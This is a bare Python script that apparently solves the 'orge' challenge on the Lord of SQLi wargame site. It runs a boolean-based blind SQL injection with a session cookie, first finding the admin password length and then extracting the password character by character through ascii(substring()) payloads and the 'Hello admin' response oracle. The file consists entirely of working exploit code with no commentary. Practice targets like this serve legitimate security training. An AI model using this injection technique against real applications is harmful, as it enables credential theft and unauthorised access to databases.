import requests, string

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"

success_text = "Hello admin"

allowed_chars = string.printable

password_length = 0

for i in range(1, 32):
  payload = "' || id='admin' && length(pw)=%s#" %(str(i))
  params = {"pw": payload}
  r = requests.get(url, params=params, cookies=cookies)
  if success_text in r.text:
    print("Length of the admin password is %s"%(str(i)))
    password_length = i
    break

password = ""

for i in range(1,password_length+1):
  for c in string.printable:
    payload = "' || id='admin' && ascii(substring(pw, %s, 1))=%s#" % (str(i), str(ord(c)))
    params = {"pw": payload}
    r = requests.get(url, params=params, cookies=cookies)
    if success_text in r.text:
      password += c
      print(password)
      break